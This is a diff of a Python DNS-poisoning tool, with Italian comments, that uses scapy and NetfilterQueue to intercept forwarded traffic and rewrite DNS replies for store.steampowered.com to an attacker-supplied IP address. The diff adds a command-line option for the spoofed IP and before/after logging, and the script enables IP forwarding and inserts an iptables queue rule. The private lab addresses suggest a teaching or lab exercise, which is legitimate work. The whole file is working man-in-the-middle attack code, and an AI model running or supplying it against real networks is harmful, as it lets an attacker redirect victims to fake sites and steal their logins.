@@ -1,26 +1,46 @@
 from scapy.all import *
 from netfilterqueue import NetfilterQueue
 import os
+import argparse
+
+parser = argparse.ArgumentParser(
+    description="Tool to execute DNS poisoning"
+)
+
+parser.add_argument(
+    "-i",
+    "--ip",
+    dest="ip",
+    help="IP address to spoof",
+    type=str,
+)
+
+args = parser.parse_args()
+
+if not args.ip:
+    print("IP required!")
+    parser.print_help()
+    sys.exit(1)
 
 dns_hosts = {
-    b"store.steampowered.com.": "10.0.2.5"
+    b"store.steampowered.com.": args.ip
 }
 
 def process_packet(packet):
     # Converte il pacchetto di NetfilterQueue in un pacchetto Scapy
-    scapy_packet = IP(packet.get_payload())
-    
+    scapy_packet = IP(packet.get_payload())    
     # Se il pacchetto è un DNS Resource Record (DNS reply)
     if scapy_packet.haslayer(DNSRR):
+        print("[Before]:", scapy_packet.summary()) 	
         try:
             scapy_packet = modify_packet(scapy_packet)
         except IndexError:
             # non è un pacchetto UDP this (pacchetti IPerror/UDPerror)
             pass
+        
+        print("[After]:", scapy_packet.summary())
         # riconverte il pacchetto a NetfilterQueue
         packet.set_payload(bytes(scapy_packet))
-
-5 16 29
     packet.accept()
 
 def modify_packet(packet):
@@ -28,12 +48,9 @@ def modify_packet(packet):
     # Prende il DNS Quetion Name (dominio)
     qname = packet[DNSQR].qname
     if qname not in dns_hosts:
-        print("Il pacchetto non è stato modificato:", qname)
+        print("The packet hasn't been motified:", qname)
         return packet
-    
-    print("[Prima]:", scapy_packet.summary())
-    
-    # store.steampowered.com sarà mappato a 10.0.2.5
+    # store.steampowered.com sarà mappato a 192.168.56.102
     # TTL: 7 giorni
     packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname], ttl=604800) 
     # Answer count a 1
@@ -43,18 +60,15 @@ def modify_packet(packet):
     del packet[IP].chksum
     del packet[UDP].len
     del packet[UDP].chksum
-    
-    print("[Dopo]:", scapy_packet.summary())
     return packet
 
-if __name__ == "__main__":
+def main():
     QUEUE_NUM = 0       # ID della coda
-    
     # Setup del forwarding di pacchetti IP
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
     # Viene inserita una FORWARD rule come richiesto dalla libreria NetfilterQueue
     os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
-    
+    print("Iptables rule updated.")
     # Viene inizializzato un oggetto NetfilterQueue
     queue = NetfilterQueue()
     try:
@@ -63,3 +77,7 @@ if __name__ == "__main__":
         queue.run()
     except KeyboardInterrupt:
         os.system("iptables --flush")
+        
+if __name__ == "__main__":
+    main()
+    
